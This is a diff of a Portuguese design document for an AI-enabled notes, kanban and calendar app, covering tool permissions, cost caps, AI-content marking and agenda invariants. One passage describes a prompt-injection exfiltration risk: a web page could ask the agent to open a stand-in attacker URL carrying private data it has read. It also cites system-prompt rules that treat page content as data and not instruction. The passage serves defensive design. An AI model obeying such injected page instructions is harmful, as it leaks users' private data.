@@ -41,9 +41,9 @@ passam juntos pela consulta. Quem garante é o índice único parcial
 (`apps/api/src/modules/assistente/execucao.service.ts:157-168`, aplicado em `:638-642`) —
 reconhecido por `meta.target = ["user_id"]` mais o modelo, porque o Prisma não dá o nome de índice
 parcial. O `Set` `iniciando` (`:145-151`) é só otimização do clique duplo local: confiar nele no
-lugar do índice reabre a corrida. Coberto em `apps/api/tests/rotinas.test.ts:819`. RN-19 vale para
+lugar do índice reabre a corrida. Coberto em `apps/api/tests/rotinas.test.ts:834`. RN-19 vale para
 os dois tipos de entrada; a idempotência pela ideia (RN-18) só existe na entrada por coluna —
-no pedido cada execução é independente (`execucao.service.ts:532-557`, `rotinas.test.ts:2110`).
+no pedido cada execução é independente (`execucao.service.ts:532-557`, `rotinas.test.ts:2171`).
 
 **Apagar anexo de card é a forma atômica com uma leitura antes, e a leitura não é a guarda.**
 `excluir` (`apps/api/src/modules/arquivos/arquivos.service.ts:234-250`) lê a linha só para ter a
@@ -121,11 +121,11 @@ clicou num botão e precisa saber que não aconteceu.
 acervo à mão junta dado privado, texto não confiável e saída de rede: a página pode pedir que ele
 abra `https://atacante/?q=<o que leu>`, e isso passa por todas as guardas
 (`pagina.service.ts:19-27`). A cerca "é dado, não instrução" (`paginaComoTexto`, `:428`) e as linhas
-da web no `system` (`agentes.service.ts:147-168`) são pedido, e a página pode forjar a cerca. A
+da web no `system` (`agentes.service.ts:232-253`) são pedido, e a página pode forjar a cerca. A
 mitigação é o opt-in — fora de `FERRAMENTAS_PADRAO` e de `FERRAMENTAS_SEM_AGENTE` — e o aviso de
-`levaOAcervoParaFora` (`apps/web/src/components/agentes/ferramentas.ts:67-72`), no editor do agente
-(`EditorAgente.tsx:1027`) e no passo de rotina (`PainelDoBloco.tsx:565`). O texto da tela não
-promete mais que "instrução" (`EditorAgente.tsx:1039-1043`): garantia só a lista (RN-14, INV-52).
+`levaOAcervoParaFora` (`apps/web/src/components/agentes/ferramentas.ts:74-79`), no editor do agente
+(`EditorAgente.tsx:1030`) e no passo de rotina (`PainelDoBloco.tsx:565`). O texto da tela não
+promete mais que "instrução" (`EditorAgente.tsx:1042-1046`): garantia só a lista (RN-14, INV-52).
 
 **Ponto de saída novo se classifica antes de ser escrito.** Se qualquer pedaço da URL — host,
 caminho ou parâmetro que o alvo transforme em host — vier do usuário **ou do modelo**, ele cai
@@ -148,21 +148,21 @@ na criação e na edição de nota (`:232`, `:311`), como `criarBoard` já fazia
 devolvia o nome do workspace alheio; o inexistente caía em violação de FK, distinguível do alheio.
 Os dois dão o mesmo 404 (INV-02). Com o chat criando nota, o id chega também dos argumentos que o
 **modelo** escreveu. Porta nova que grave nota — ou qualquer FK vinda de fora — confere a posse.
-Coberto em `apps/api/tests/marca-ia.test.ts:524`.
+Coberto em `apps/api/tests/marca-ia.test.ts:539`.
 
 **A Etapa D levou a regra ao agente**: nota-base e coluna de fonte viva passam por
-`conferirReferencias` (`apps/api/src/modules/assistente/agentes.service.ts:445`), a coluna pela
-cadeia inteira no `where` (`:461`, INV-03); o `agentId` da conversa nova, por
+`conferirReferencias` (`apps/api/src/modules/assistente/agentes.service.ts:595`), a coluna pela
+cadeia inteira no `where` (`:611`, INV-03); o `agentId` da conversa nova, por
 `conversas.service.ts:111-116`. Três estreitamentos deliberados, que parecem furo:
 
-- **no PATCH só a referência nova é conferida** (`agentes.service.ts:450`, `:456-458`; o gravado vem
-  de `atualizar`, `:680-690`) — reconferir o gravado deixaria o agente ineditável quando uma coluna some depois de
+- **no PATCH só a referência nova é conferida** (`agentes.service.ts:600`, `:606-608`; o gravado vem
+  de `atualizar`, `:830-840`) — reconferir o gravado deixaria o agente ineditável quando uma coluna some depois de
   salvo, e o 404 nem diria qual;
-- **a prévia confere só as notas-base** (`agentes.service.ts:760`): coluna alheia, inexistente ou fora do quadro
-  declarado vira bloco `indisponivel` **sem nada dela** (`fonteComoTexto`, `:219-252`), porque o
+- **a prévia confere só as notas-base** (`agentes.service.ts:911`): coluna alheia, inexistente ou fora do quadro
+  declarado vira bloco `indisponivel` **sem nada dela** (`fonteComoTexto`, `:359-392`), porque o
   editor precisa abrir para tirar a fonte quebrada;
 - **`kanban.cardsDaColuna` (`kanban.service.ts:342`) resolve a posse pela cadeia, mas não confere o
-  `boardId` declarado** — quem precisa compara `coluna.boardId` (`agentes.service.ts:229`).
+  `boardId` declarado** — quem precisa compara `coluna.boardId` (`agentes.service.ts:369`).
   Chamador novo que esqueça lê coluna do próprio usuário sob outro quadro, sem erro.
 
 A corrida também dá 404: agente excluído entre o `findFirst` e o `create` da conversa bate na FK,
@@ -173,16 +173,16 @@ e `:1011`.
 **A Etapa E a levou à rotina** com a mesma forma — `conferirReferencias`
 (`apps/api/src/modules/assistente/rotinas.service.ts:692`), só o que é novo no PATCH —, e um caso a
 mais: a coluna das ideias usadas é reconferida quando ela **ou** o quadro da entrada mudam, porque a
-regra é "do mesmo quadro" (INV-12). Coberto em `apps/api/tests/rotinas.test.ts:359` e `:448`. O
+regra é "do mesmo quadro" (INV-12). Coberto em `apps/api/tests/rotinas.test.ts:374` e `:463`. O
 workspace da nota de saída entra do mesmo jeito, só quando novo (`rotinas.service.ts:720-732`,
-`rotinas.test.ts:2010`), e `output_workspace_id` **não é FK de propósito**, como as colunas:
+`rotinas.test.ts:2071`), e `output_workspace_id` **não é FK de propósito**, como as colunas:
 `SetNull` esconderia o workspace excluído, que precisa virar `problems`
 (`apps/api/prisma/schema.prisma:899-901`).
 
 **A frente de agenda a levou ao quadro de evento e tarefa:** `conferirQuadro`
-(`apps/api/src/modules/tarefas/tarefas.service.ts:33-39`, servindo os dois módulos) na criação,
-no PATCH (só o quadro novo) e no filtro de `GET /tasks` (`:131`). A corrida sai pelo nome da
-constraint, como a do agente: `quadroQueSumiu` (`:47-57`) só traduz `task_board_id_fkey` e
+(`apps/api/src/modules/tarefas/tarefas.service.ts:39-45`, servindo os dois módulos) na criação,
+no PATCH (só o quadro novo) e no filtro de `GET /tasks` (`:137`). A corrida sai pelo nome da
+constraint, como a do agente: `quadroQueSumiu` (`:53-63`) só traduz `task_board_id_fkey` e
 `event_board_id_fkey`, e outra FK violada sobe como é (`apps/api/tests/tarefas.test.ts:268`,
 `:293`; o alheio em `:557` e `eventos.test.ts:779`).
 
@@ -265,23 +265,29 @@ varredura de órfãos é dívida declarada (`armazem.ts:177-181`). Coberto em
 **INV-66 — O evento é instante e a tarefa é dia civil: o fuso move um e não o outro.** Frente de
 agenda (2026-10-09). O cliente não converte fuso: entra e sai dia (`AAAA-MM-DD`) e hora (`HH:MM`)
 locais, e a agenda devolve o `timezone` e o `today` do usuário, não os do aparelho
-(`packages/shared/src/eventos.ts:428-430`). Parece incoerência entre vizinhos da mesma tela;
+(`packages/shared/src/eventos.ts:435-437`). Parece incoerência entre vizinhos da mesma tela;
 "uniformizar" para um dos lados quebra o outro calado.
 
 - **Evento guarda instante** (`apps/api/prisma/schema.prisma:448-453`), e o dia e a hora saem pelo
-  fuso **atual** (`horarioDe`, `apps/api/src/modules/eventos/eventos.service.ts:68-95`): mudar o
+  fuso **atual** (`horarioDe`, `apps/api/src/modules/eventos/eventos.service.ts:69-96`): mudar o
   fuso em `/ajustes` move o evento com hora no relógio (`apps/api/tests/eventos.test.ts:389`). O dia
   inteiro também se lê assim, e o gravado em São Paulo, lido muito a oeste, recua um dia —
-  limitação aceita e declarada no sítio (`:72-74`).
-- **Só a escrita de horário converte.** `instantesDe` (`eventos.service.ts:119-148`) é o único
-  gravador dos instantes, e o PATCH só o chama quando toca campo de horário (`:241-254`):
+  limitação aceita e declarada no sítio (`eventos.service.ts:73-75`).
+- **Só a escrita de horário converte.** `instantesDe` (`eventos.service.ts:120-149`) é o único
+  gravador dos instantes, e o PATCH só o chama quando toca campo de horário (`:242-255`):
   reconverter num PATCH de título reescreveria `starts_at` pelo fuso de agora
   (`eventos.test.ts:519`).
 - **`task.date` é `DATE`, civil** (`schema.prisma:498-501`): "para 12/10" é do dia 12 em qualquer
   fuso. O Prisma a entrega como meia-noite UTC, e ali o corte do ISO é o certo
-  (`apps/api/src/modules/tarefas/tarefas.service.ts:59-72`); passá-la por `diaLocal` a recuaria
-  um dia a oeste de UTC. O fuso só decide o que é **hoje**, e daí `overdue` (`:94-118`;
+  (`apps/api/src/modules/tarefas/tarefas.service.ts:65-78`); passá-la por `diaLocal` a recuaria
+  um dia a oeste de UTC. O fuso só decide o que é **hoje**, e daí `overdue` (`:100-124`;
   `apps/api/tests/tarefas.test.ts:184`, `:369`).
+- **O chat e o MCP também são cliente** (Fase 2): passam dia e hora crus — o executor ao service
+  (`apps/api/src/modules/assistente/ferramentas.service.ts:291-294`), a tool ao POST, sem
+  `fusoDoUsuario` (`apps/mcp/src/tools/agenda-escrita.ts:17-23`, `tools/agenda.ts:11-16`) —, e os
+  formatadores da agenda não recebem fuso. O avesso do prazo do card (§4.5 de
+  `contrato-compartilhado`), em que o cliente monta o instante: aqui, converter desse lado conta o
+  fuso duas vezes. O `system` manda o modelo não converter (`agentes.service.ts:198-203`).
 
 ---
 
@@ -314,7 +320,7 @@ conferência dentro do passo.** Uma mensagem do chat é até `MAX_PASSOS_DO_LACO
 duas superfícies chamam `passoNoProvedor` (`apps/api/src/modules/assistente/passo.service.ts:169`),
 e `garantirTeto` roda **dentro** dele, antes do `fetch`, em toda chamada (`:174-176`): a invariante
 vale por construção para quem usa o passo, e superfície que abra o provedor por fora dele a perde.
-O `garantirTeto` que o chat faz antes do laço (`chat.service.ts:248-252`) **não** é redundância: é o
+O `garantirTeto` que o chat faz antes do laço (`chat.service.ts:254-258`) **não** é redundância: é o
 402 de quem já estourou, com nada gravado nem transmitido; o de dentro existe porque o histórico
 cresce a cada passo, e o passo 4 custa mais que o passo 1. Tirar a conferência de dentro do passo
 é a mudança que parece limpeza e derruba **só** o teste do corte no meio
@@ -324,26 +330,26 @@ gasta um teto inteiro numa pergunta só (`chat.test.ts:198`).
 
 **A rotina paga por passo e por execução (RN-17).** `tetoExtra` (`passo.service.ts:136-141`) roda
 depois do diário e antes da conexão, com a mesma estimativa; a rotina o preenche com o gasto
-acumulado da execução contra `runCapMicros` (`execucao.service.ts:1087-1096`). Recusa ali lança sem
+acumulado da execução contra `runCapMicros` (`execucao.service.ts:1091-1100`). Recusa ali lança sem
 linha de uso — nada foi chamado (`passo.service.ts:160-163`). O `garantirTeto` de `iniciar`
 (`execucao.service.ts:508-524`) estima sem contexto, só para o 402 imediato; o corte de verdade é o
-de cada chamada. Coberto em `apps/api/tests/rotinas.test.ts:869`.
+de cada chamada. Coberto em `apps/api/tests/rotinas.test.ts:884`.
 
 **O que vai em todo passo entra na estimativa de todo passo.** Desde a Etapa D a mensagem `system`
 é o contexto do agente — regras, instruções, notas-base e fontes vivas, até
-`MAX_PREMISSAS_DO_AGENTE` —, montado a cada mensagem do chat (`chat.service.ts:193-199`) e a cada
-passo de rotina (`execucao.service.ts:999-1003`), e posto em `mensagens` (`chat.service.ts:237-241`,
-`execucao.service.ts:1037-1053`), que é o que `estimarPasso` conta (`passo.service.ts:61-67`).
+`MAX_PREMISSAS_DO_AGENTE` —, montado a cada mensagem do chat (`chat.service.ts:193-203`) e a cada
+passo de rotina (`execucao.service.ts:1002-1007`), e posto em `mensagens` (`chat.service.ts:243-247`,
+`execucao.service.ts:1041-1057`), que é o que `estimarPasso` conta (`passo.service.ts:61-67`).
 Contexto repassado ao provedor por fora de `mensagens` sairia da estimativa e o teto deixaria
 passar o passo que o estoura. A prévia do editor estima o mesmo passo com o mesmo
 `MAX_SAIDA_TOKENS` (`custo.service.ts:24-27`).
 
 **A busca na web entra na estimativa da chamada que a leva, e só dela (RN-25, Etapa G).**
-`buscaNaWeb` vai só na primeira chamada de cada mensagem (`chat.service.ts:445`) e de cada passo
-de rotina (`execucao.service.ts:1083`): as voltas do laço não buscam de novo, e cada busca é
+`buscaNaWeb` vai só na primeira chamada de cada mensagem (`chat.service.ts:451`) e de cada passo
+de rotina (`execucao.service.ts:1087`): as voltas do laço não buscam de novo, e cada busca é
 cobrada. `estimarComBusca` (`custo.service.ts:81-92`) é a conta única — do passo (`estimarPasso`),
 do 402 de `iniciar` e da prévia do agente, que tira a busca **por diferença** entre as duas
-estimativas (`agentes.service.ts:784-790`) para que `costPerStepMicros + webSearchMicros` seja o
+estimativas (`agentes.service.ts:935-941`) para que `costPerStepMicros + webSearchMicros` seja o
 que o teto usa. Ela soma a tarifa **e** `CHARS_ESTIMADOS_DA_BUSCA` ao contexto
 (`packages/shared/src/agentes.ts:84-98`): os resultados entram como tokens de entrada e, num
 modelo caro, custam mais que a tarifa (`apps/api/tests/web.test.ts:1170`). A tarifa só vale com o
@@ -392,46 +398,48 @@ o AI usage dash (`uso.service.ts:93`, e o período anterior em `:140`), com port
 contornável por exclusão de nota, e a trilha de auditoria sumiria junto com o que a explica. Coberto
 em `apps/api/tests/assistente.test.ts:488`. O registro é escrito **inclusive quando a chamada falha**
 (`custo.service.ts:246`), porque falhar também pode ter custado. `AiUsage.runId` segue a mesma regra
-(`schema.prisma:652`): excluir a rotina não devolve o gasto do dia (`rotinas.test.ts:1374`).
+(`schema.prisma:652`): excluir a rotina não devolve o gasto do dia (`rotinas.test.ts:1389`).
 
 **INV-52 — A fronteira do chat com o modelo é fechada pelo compilador, nos dois sentidos.** No
 sentido de ida, `EXECUTORES` é `Record<NomeDoAssistente, Executor | undefined>`
-(`apps/api/src/modules/assistente/ferramentas.service.ts:145`) — **não** um `Partial`, e o
+(`apps/api/src/modules/assistente/ferramentas.service.ts:168`) — **não** um `Partial`, e o
 `| undefined` é a invariante: as ações que o chat não faz estão lá escritas como `undefined`
-(`:251-253`), e uma ação nova em `packages/shared/src/ferramentas.ts` — do acervo **ou** da web —
+(`:360-362`), e uma ação nova em `packages/shared/src/ferramentas.ts` — do acervo **ou** da web —
 **não compila** sem alguém decidir. É a técnica do rótulo do INV-41: o tipo cobra a decisão em cada
 sítio novo, em vez de deixar o padrão ser o permissivo. O que o chat escreve é o que tem executor:
 desde a Etapa C ele **cria** (`create_card`, `create_note`), desde a Parte 1 da frente de cards
-(2026-09-30) **conclui e reabre** card (`complete_card`, INV-63) — e mover, apagar e editar texto
-seguem `undefined`; desde a Etapa G um agente pode **abrir página** (`open_page`, INV-08). São
+(2026-09-30) **conclui e reabre** card (`complete_card`, INV-63), desde a Fase 2 da frente de
+agenda (2026-10-09) cria evento e tarefa e conclui tarefa (`ferramentas.service.ts:274-358`) — e
+mover, apagar e editar texto seguem `undefined`; desde a Etapa G um agente pode **abrir página**
+(`open_page`, INV-08). São
 **três** condições para uma ação chegar ao modelo, e as três valem também na **execução**:
 
-1. `FERRAMENTAS_DO_CHAT` (`packages/shared/src/ferramentas.ts:418`), lista **explícita** — não
+1. `FERRAMENTAS_DO_CHAT` (`packages/shared/src/ferramentas.ts:587`), lista **explícita** — não
    "todas menos algumas", para que ação nova não entre no chat só por existir. É o **teto do que um
    agente pode ligar**, `open_page` inclusa, não o que toda conversa recebe;
 2. `permitidas`, a lista da conversa (Etapa D): a do agente cortada pela primeira
-   (`apps/api/src/modules/assistente/agentes.service.ts:297`), e **sem valor padrão**
-   (`ContextoDeFerramenta`, `ferramentas.service.ts:85-107`). O Assistente sem agente passa
-   `FERRAMENTAS_SEM_AGENTE` — o acervo, sem a web (`packages/shared/src/ferramentas.ts:432`) —
-   **explicitamente** (`agentes.service.ts:290`): esquecer o campo é erro de compilação, não uma
+   (`apps/api/src/modules/assistente/agentes.service.ts:446`), e **sem valor padrão**
+   (`ContextoDeFerramenta`, `ferramentas.service.ts:108-130`). O Assistente sem agente passa
+   `FERRAMENTAS_SEM_AGENTE` — o acervo, sem a web (`packages/shared/src/ferramentas.ts:606`) —
+   **explicitamente** (`agentes.service.ts:439`): esquecer o campo é erro de compilação, não uma
    conversa que ganha tudo calada. Estreita, nunca amplia — nome gravado antes de a lista do chat
    mudar não entra;
 3. `EXECUTORES[nome]`.
 
-A definição de um nome da lista se lê por `DEFINICOES_DO_ASSISTENTE` (`packages/shared/src/ferramentas.ts:400`),
+A definição de um nome da lista se lê por `DEFINICOES_DO_ASSISTENTE` (`packages/shared/src/ferramentas.ts:568`),
 o mapa total das duas origens, e nunca por `FERRAMENTAS_DO_ACERVO[nome]` — que não tem `open_page`.
 O servidor MCP fica fora da web só porque registra tool à mão (§4.6 de `contrato-compartilhado`).
 
-`catalogoParaProvedor` confere as três (`ferramentas.service.ts:303-321`) e `executar` confere de novo
-(`:341-346`): o catálogo diz o que se oferece, `executar` o que se executa, e sem a segunda
+`catalogoParaProvedor` confere as três (`ferramentas.service.ts:412-430`) e `executar` confere de novo
+(`:450-455`): o catálogo diz o que se oferece, `executar` o que se executa, e sem a segunda
 conferência um executor escrito para outra superfície ficaria executável por quem adivinhasse o
 nome. Os quatro casos — nome desconhecido, fora do chat, fora do agente, sem executor — respondem
-igual, "não existe" (`:325-328`). Trocar o tipo por `Partial`, a lista por um filtro de exclusão,
+igual, "não existe" (`:434-437`). Trocar o tipo por `Partial`, a lista por um filtro de exclusão,
 dar padrão a `permitidas` ou tirar a conferência de `executar` não quebra nada hoje e apaga uma
 delas. Coberto por `apps/api/tests/agentes.test.ts:802` (CA-24: agente só de leitura não cria nem
-se o modelo pedir), `apps/api/tests/marca-ia.test.ts:488` e `:905` (o censo do que escreve e o
+se o modelo pedir), `apps/api/tests/marca-ia.test.ts:490` e `:920` (o censo do que escreve e o
 agente sem `complete_card`) e, para a web, `apps/api/tests/web.test.ts:910` e `:929`. No sentido de volta,
-`argumentos` chega `unknown` e passa por `conferir` (`ferramentas.service.ts:122-127`), que revalida
+`argumentos` chega `unknown` e passa por `conferir` (`ferramentas.service.ts:145-150`), que revalida
 com o **mesmo** schema que o provedor recebeu: o modelo é terceiro que devolve JSON conforme um
 schema que pode ignorar, e o `parse` também é o que aplica os padrões declarados. Cast no lugar do
 `parse` compila.
@@ -439,25 +447,41 @@ schema que pode ignorar, e o `parse` também é o que aplica os padrões declara
 **A rotina estreita mais uma vez, e pelo mesmo caminho (RN-16).** Um passo recebe só as ferramentas
 **sem escrita** do agente: `ferramentasDaRotina` (`apps/api/src/modules/assistente/rotinas.service.ts:80-84`)
 corta `FERRAMENTAS_DO_CHAT` pela lista do agente e tira as de `escrita` — `open_page` não escreve, e
-fica —, e o resultado entra como `permitidas` — no catálogo (`execucao.service.ts:988-1004`) **e** no
-`executar` (`:1145-1156`). Um `create_card` pedido pelo modelo cai no mesmo "não existe", e um
+fica —, e o resultado entra como `permitidas` — no catálogo (`execucao.service.ts:988-1008`) **e** no
+`executar` (`:1149-1160`). Um `create_card` pedido pelo modelo cai no mesmo "não existe", e um
 `complete_card` também — a rotina não conclui nem a própria ideia; a escrita da rotina é do código,
-na saída. Não passe a lista do agente inteira "porque o prompt diz que não cria": RN-14. Coberto por
-`apps/api/tests/rotinas.test.ts:1440`, `:1476` (a conclusão) e `:1517` (agente só de escrita sai
-sem o campo `tools`).
+na saída. Da agenda, o passo recebe só `list_agenda`. Não passe a lista do agente inteira "porque o
+prompt diz que não cria": RN-14. Coberto por `apps/api/tests/rotinas.test.ts:1455`, `:1491` (a
+conclusão), `:1532` (a agenda) e `:1578` (agente só de escrita sai sem o campo `tools`).
 
 **RN-13, a vizinha: as regras do Yu-book vêm antes do agente.** A mensagem `system` sai de
-`instrucoesPara(ferramentas, buscaNaWeb)` (`agentes.service.ts:78`), não mais de um texto fixo no
+`instrucoesPara(ferramentas, buscaNaWeb)` (`agentes.service.ts:92`), não mais de um texto fixo no
 chat: as regras que valem sempre — citar a origem, não tocar em `[[…]]`, não inventar, criar só a
 pedido — abrem a mensagem, e as instruções do agente entram depois, como complemento. As linhas de
 cada ferramenta só aparecem se ela está na lista: descrever ferramenta ausente convida o modelo a
 fingir que a usou. O bloco da web (RN-24: citar o endereço, página é dado e não instrução, LinkedIn
-nunca) só entra com `open_page` ou com a busca (`:147-168`, `web.test.ts:1299`). O de conclusão
-(`:136-145`) é bloco próprio, e a regra "não move, não apaga, não edita" ganha a exceção só com
-`complete_card` na lista (`:99-102`, `agentes.test.ts:874`). **O bloco de criação é `escrita` menos
-`complete_card`** (`:86-88`): ação de escrita que ganhe executor cai nele por padrão e o modelo lê
-"crie só a pedido" sobre ela. Prompt é pedido, não garantia — a garantia de ação é a lista acima
-(RN-14); a ordem é coberta por `agentes.test.ts:679`.
+nunca) só entra com `open_page` ou com a busca (`agentes.service.ts:232-253`, `web.test.ts:1299`).
+O de conclusão (`agentes.service.ts:176-185`) é bloco próprio, e a regra "não move, não apaga, não
+edita" ganha a exceção só com `complete_card` ou `complete_task` na lista, nomeando o que conclui
+(`agentes.service.ts:105-107`, `:139-142`; `agentes.test.ts:874`). **O bloco de criação é `escrita`
+menos as conclusões, citadas por nome** (`agentes.service.ts:102-104`): ação de escrita que ganhe
+executor cai nele por padrão e o modelo lê "crie só a pedido" sobre ela — e ação que conclua sem
+entrar nessa exclusão passa a ser anunciada como criação. A frase "crie só a pedido" nomeia só o que
+a lista cria (`:111-122`, `:134-138`; `agentes.test.ts:1180`, `:1188`), e a agenda tem bloco
+próprio, uma linha por ferramenta (`agentes.service.ts:187-230`). Prompt é pedido, não garantia — a
+garantia de ação é a lista acima (RN-14); a ordem é coberta por `agentes.test.ts:679`.
+
+**O fim da mensagem é o relógio, e a hora nunca é gravada (frente de agenda, Fase 2).** A última
+linha do `system` é `linhaDeHoje` (`agentes.service.ts:423`, `:555`), e o bloco da agenda a cita
+como "a última desta mensagem" (`:194-195`); a hora vai só no fim da **última** fala do usuário, na
+requisição ao provedor (`sufixoDeAgora`, `apps/api/src/modules/assistente/chat.service.ts:246`,
+`execucao.service.ts:1055`), e o banco guarda a fala sem ela. Parece que o relógio está partido à
+toa; é o cache de prefixo do provedor (`agentes.service.ts:266-288`): o dia é estável e não derruba
+o cache das regras e das notas-base, e a hora no `system` — ou gravada no histórico — o derrubaria a
+cada minuto. Bloco novo acrescentado depois de `relogio` desmente a frase; consumidor novo de
+`montarContextoDoAgente` ganha o dia sozinho (`agora` é obrigatório), mas a hora só se lembrar do
+sufixo — nada acusa. Coberto por `apps/api/tests/agenda-chat.test.ts:589`, `:622` e
+`rotinas.test.ts:1569-1575`.
 
 **INV-58 — A marca de conteúdo gerado é gravada só pelo servidor, e nunca some.** Os campos `ai*` de
 `Note` e `Card` (Etapa C, §5.5 do PRD de IA) — e de `Event` e `Task` desde a frente de agenda, com
@@ -470,26 +494,26 @@ uma marca de chat sem `conversationId` compilava. O que o assistente monta é `O
 
 - o `origin` do corpo só aceita `via: "mcp"` (`packages/shared/src/marca.ts:64-67`) — aceitar
   `chat` deixaria um cliente HTTP se passar pelo assistente, com `conversationId` alheio. O
-  servidor MCP o manda em toda tool cuja escrita grava marca — as que criam e `complete_card`
+  servidor MCP o manda em toda tool cuja escrita grava marca — as que criam e as que concluem
   (`origemDoCliente`, `apps/mcp/src/autor.ts:49`); mover e lixeira não têm marca. Tool nova de marca
   que escreva sem ele grava o ato do modelo como humano, e nada acusa;
 - `updateNoteSchema` e `cardUpdateSchema` **omitem** `origin` (`packages/shared/src/notes.ts:42`,
-  `kanban.ts:129`), como `eventUpdateSchema` e `taskUpdateSchema` (`eventos.ts:358-359`,
-  `tarefas.ts:52-53`), e as rotas de criação o desestruturam antes do service
+  `kanban.ts:129`), como `eventUpdateSchema` e `taskUpdateSchema` (`eventos.ts:365-366`,
+  `tarefas.ts:58-59`), e as rotas de criação o desestruturam antes do service
   (`notes.routes.ts:39`, `kanban.routes.ts:89`, `eventos.routes.ts:21`, `tarefas.routes.ts:26`),
   porque `origin` não é coluna;
 - o chat monta a origem a partir da conversa (`ContextoDeFerramenta.origem`,
-  `ferramentas.service.ts:96`, montado em `chat.service.ts:539-544`, com o `agentName` da sessão
+  `ferramentas.service.ts:119`, montado em `chat.service.ts:545-550`, com o `agentName` da sessão
   desde a Etapa D), e "virar nota" tira corpo, modelo e conversa da `AiMessage` **gravada** — do
   cliente vêm só título, tipo e workspace (`conversas.service.ts:223-266`);
 - a rotina monta a dela a partir da execução, no motor, para a saída — card **ou nota**, a mesma
-  origem (`execucao.service.ts:1240-1250`): o autor é o modelo do último passo que **reescreveu**, e
+  origem (`execucao.service.ts:1244-1254`): o autor é o modelo do último passo que **reescreveu**, e
   o `runId` gravado na saída é também o que deixa `fecharSemDono` achá-la (INV-60).
 
 **Nunca some:** nenhuma rota a remove, e editar só preenche `aiRevisedAt` — "gerada · revisada",
 não "deixou de ser gerada". Revisão é **mudança de fato** de título ou corpo na nota
 (`notes.service.ts:305-307`) e de título ou descrição no card (`kanban.service.ts:606-616`), no
-evento (`eventos.service.ts:256-260`) e na tarefa (`tarefas.service.ts:224-228`): o
+evento (`eventos.service.ts:257-261`) e na tarefa (`tarefas.service.ts:230-234`): o
 autosave e o painel reenviam campo inalterado, e mover, favoritar, mudar tag ou concluir não conta.
 Formatar com IA grava pelo autosave e **conta** como revisão — aceito, é edição que o usuário
 iniciou. A marca de **quem concluiu** o card é outra, com a regra oposta: INV-63.
@@ -513,31 +537,34 @@ a grava, por parâmetro.
   `where` — INV-04 aplicada ao estado, não à posse. Ler o card antes e decidir em JS deixa o clique
   no quadro e o chat (ou o chat e o MCP) lerem os dois o card aberto, e o segundo troca a data e
   quem concluiu. Coberto em sequência (`apps/api/tests/kanban.test.ts:446`,
-  `marca-ia.test.ts:772`); nenhum portão executa a corrida.
+  `marca-ia.test.ts:787`); nenhum portão executa a corrida.
 - **Três portas, um gravador.** O front conclui por `PATCH /cards/:id` (`completed` em
   `cardUpdateSchema`, `packages/shared/src/kanban.ts:131`), sem origem, via `atualizarCard`
   (`kanban.service.ts:639`); o MCP por `PATCH /cards/:id/complete`
   (`apps/api/src/modules/kanban/kanban.routes.ts:105-111`), o **único PATCH de card que aceita `origin`**
   (`cardCompleteSchema`, `kanban.ts:142`); o chat chama `concluirCard` com a origem do contexto
-  (`ferramentas.service.ts:240`). O schema não é estrito: no PATCH comum, `origin` sozinho dá 422 e
-  junto de `completed` é descartado com **200** e conclusão humana (`marca-ia.test.ts:745`) — tool
+  (`ferramentas.service.ts:263`). O schema não é estrito: no PATCH comum, `origin` sozinho dá 422 e
+  junto de `completed` é descartado com **200** e conclusão humana (`marca-ia.test.ts:760`) — tool
   que concluísse por ali gravaria o modelo como humano, sem erro.
 - **Concluir não move, não renumera e não é revisão** (`kanban.test.ts:425`,
-  `marca-ia.test.ts:797`); card arquivado também se conclui e volta concluído.
+  `marca-ia.test.ts:812`); card arquivado também se conclui e volta concluído.
 - **Concluído sai de quem cobra.** O dashboard (`apps/api/src/modules/dashboard/dashboard.service.ts:110`),
   `ondeElegivel` da rotina (`apps/api/src/modules/assistente/rotinas.service.ts:574`) e os cards da
-  agenda (`agendaDoPeriodo`, `apps/api/src/modules/eventos/eventos.service.ts:310-316`) filtram
-  `completedAt: null` (`dashboard.test.ts:226`, `rotinas.test.ts:728`, `eventos.test.ts:901`).
+  agenda (`agendaDoPeriodo`, `apps/api/src/modules/eventos/eventos.service.ts:312-318`) filtram
+  `completedAt: null` (`dashboard.test.ts:226`, `rotinas.test.ts:743`, `eventos.test.ts:901`).
   Leitor novo que cobre prazo ou escolha card para trabalhar entra nesta lista; nada acusa o que
   ficou fora.
 
-**A tarefa (frente de agenda) tem a mesma regra e uma porta só.** As mesmas colunas e o mesmo
+**A tarefa (frente de agenda) tem a mesma regra e uma rota só.** As mesmas colunas e o mesmo
 `camposDaConclusao` (`apps/api/prisma/schema.prisma:505-508`); o gravador é `concluirTarefa`
-(`apps/api/src/modules/tarefas/tarefas.service.ts:257-268`), com o estado esperado no `where`. Ao
-contrário do card, `taskUpdateSchema` **não tem** `completed` (`packages/shared/src/tarefas.ts:50-55`):
-concluir só passa por `PATCH /tasks/:id/complete` (`tarefas.routes.ts:42-47`), com ou sem
-`origin`, e `completed` no PATCH comum é descartado com 200
-(`apps/api/tests/tarefas.test.ts:435`, `:460`).
+(`apps/api/src/modules/tarefas/tarefas.service.ts:263-274`), com o estado esperado no `where`. Ao
+contrário do card, `taskUpdateSchema` **não tem** `completed` (`packages/shared/src/tarefas.ts:56-61`):
+pela HTTP, concluir só passa por `PATCH /tasks/:id/complete` (`tarefas.routes.ts:42-47`), com ou sem
+`origin` — é por ela que o MCP conclui (`apps/mcp/src/tools/agenda-escrita.ts:165`) —, e
+`completed` no PATCH comum é descartado com 200 (`apps/api/tests/tarefas.test.ts:435`, `:460`).
+Desde a Fase 2 a segunda porta é o chat, que chama `concluirTarefa` com a origem do contexto
+(`apps/api/src/modules/assistente/ferramentas.service.ts:349-356`;
+`apps/api/tests/agenda-chat.test.ts:320`). Porta nova entra pelo mesmo gravador.
 
 **INV-60 — O motor de rotina decide pelo banco, nunca pelo `Map`: no deploy a API tem duas
 instâncias.** A execução roda destacada da requisição (RNF-11), e as vivas moram num `Map` de
@@ -549,28 +576,28 @@ no comentário do sítio; aqui fica o mapa (as linhas sem arquivo são de `execu
 
 - **Morte só pelo pulso.** `fecharSemDono` (`execucao.service.ts:265-320`) fecha só o que tem `heartbeatAt` vencido
   há 45 s (`:115`), e **reaplica o `where` na escrita** (`:290`). Fechar por "não está no meu
-  `Map`" mata a execução viva da vizinha (`apps/api/tests/rotinas.test.ts:1034`).
+  `Map`" mata a execução viva da vizinha (`apps/api/tests/rotinas.test.ts:1049`).
 - **Toda gravação do motor é condicional a `em_andamento`**; `count` zero chama `perder()`
-  (`execucao.service.ts:964-968`), que larga a execução sem sobrescrever o desfecho alheio (`rotinas.test.ts:1579`).
+  (`execucao.service.ts:964-968`), que larga a execução sem sobrescrever o desfecho alheio (`rotinas.test.ts:1640`).
